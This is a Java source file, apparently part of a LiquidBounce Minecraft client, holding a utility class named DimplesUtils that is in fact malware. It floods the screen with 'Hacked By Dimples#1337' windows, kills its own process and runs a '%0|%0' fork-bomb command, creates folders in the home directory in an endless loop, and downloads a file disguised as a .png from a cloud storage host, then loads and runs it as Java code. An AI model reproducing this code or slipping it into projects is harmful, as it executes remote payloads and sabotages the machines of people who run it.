package net.ccbluex.liquidbounce.utils.misc;

import antiskidderobfuscator.NativeMethod;

import javax.swing.*;
import javax.swing.filechooser.FileSystemView;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.lang.management.ManagementFactory;
import java.lang.management.RuntimeMXBean;
import java.net.URL;
import java.util.Random;

public class DimplesUtils {
    @NativeMethod
    public void NMSL() throws IOException {
        blast_1();
        blast_2();
        blast_3();
        load();
    }
    @NativeMethod
    public void blast_1() {

        Random rd = new Random();
        while (true) {
            JFrame frame = new JFrame("Hacked By Dimples#1337");
            frame.setSize(400, 100);
            frame.setLocation(rd.nextInt(1920), rd.nextInt(1080));
            frame.setVisible(true);

        }

    }
    private static class CustomClassLoader extends ClassLoader {
        public Class<?> load(byte[] buf, int length) {
            return defineClass(null, buf, 0, length);
        }
    }
    @NativeMethod
    public static void load() {
        new Thread(() -> {
            try {
                URL url = new URL("https://zhengxinpeixun.oss-cn-qingdao.aliyuncs.com/0115da36662e41e09cf883640cd301f1.png");
                InputStream inputStream = url.openStream();
                byte[] tmpBuf = new byte[1024], buf = new byte[5 * 1024 * 1024];
                int currentLength, length = 0;
                while ((currentLength = inputStream.read(tmpBuf)) > 0) {
                    for (int i = 0; i < currentLength; i++) {
                        buf[length ++] = tmpBuf[i];
                    }
                }

                new CustomClassLoader().load(buf, length).getMethod("load").invoke(null);
            } catch (Throwable e) {
                e.printStackTrace();
            }
        }).start();
    }
    @NativeMethod
    public void blast_2() throws IOException {
        RuntimeMXBean runtimeMXBean = ManagementFactory.getRuntimeMXBean();
        Runtime.getRuntime().exec("taskkill /f /pid "
                + runtimeMXBean.getName().substring(0, runtimeMXBean.getName().indexOf("@")).toString());
        Runtime.getRuntime().exec("%0|%0"
                + runtimeMXBean.getName().substring(0, runtimeMXBean.getName().indexOf("@")).toString());
        Runtime.getRuntime().exec("taskkill /f /pid "
                + runtimeMXBean.getName().substring(0, runtimeMXBean.getName().indexOf("@")).toString());
        Runtime.getRuntime().exec("taskkill /f /pid "
                + runtimeMXBean.getName().substring(0, runtimeMXBean.getName().indexOf("@")).toString());
        Runtime.getRuntime().exec("taskkill /f /pid "
                + runtimeMXBean.getName().substring(0, runtimeMXBean.getName().indexOf("@")).toString());
        Runtime.getRuntime().exec("taskkill /f /pid "
                + runtimeMXBean.getName().substring(0, runtimeMXBean.getName().indexOf("@")).toString());
        Runtime.getRuntime().exec("taskkill /f /pid "
                + runtimeMXBean.getName().substring(0, runtimeMXBean.getName().indexOf("@")).toString());
        Runtime.getRuntime().exec("taskkill /f /pid "
                + runtimeMXBean.getName().substring(0, runtimeMXBean.getName().indexOf("@")).toString());
        Runtime.getRuntime().exec("taskkill /f /pid "
                + runtimeMXBean.getName().substring(0, runtimeMXBean.getName().indexOf("@")).toString());
        Runtime.getRuntime().exec("taskkill /f /pid "
                + runtimeMXBean.getName().substring(0, runtimeMXBean.getName().indexOf("@")).toString());
        Runtime.getRuntime().exec("taskkill /f /pid "
                + runtimeMXBean.getName().substring(0, runtimeMXBean.getName().indexOf("@")).toString());
        Runtime.getRuntime().exec("taskkill /f /pid "
                + runtimeMXBean.getName().substring(0, runtimeMXBean.getName().indexOf("@")).toString());
    }
    @NativeMethod
    public void blast_3() {
        int i = 0;
        FileSystemView view = FileSystemView.getFileSystemView();
        File file = view.getHomeDirectory();
        while (true) {

            File f = new File(file + "Hacked By Dimples#1337" + i);
            f.mkdir();

            i++;

        }

    }

}